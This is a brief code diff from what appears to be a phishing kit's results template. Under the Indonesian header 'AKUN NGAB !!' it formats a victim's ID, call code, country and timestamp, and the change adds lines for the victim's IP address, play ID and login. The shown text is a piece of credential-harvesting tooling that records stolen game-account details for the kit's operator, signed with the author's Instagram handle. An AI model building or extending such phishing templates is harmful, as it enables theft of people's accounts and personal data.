@@ -62,9 +62,13 @@ AKUN NGAB !!
 >> ID >> $playid
 >> Call Code >> $ccode
 >> Country >> $country
+>> IP Address >> $ip
+>> Playid >> $playid
+>> Login >> $login
 ━━━━━━━━━━━━
 ~> ᴅᴀᴛᴇ » $time
 ━━━━━━━━━━━━
+
 ιɴsтᴀԍʀᴀм: @ᴀʀᴅʏɴvʏɴ__
 ");
 
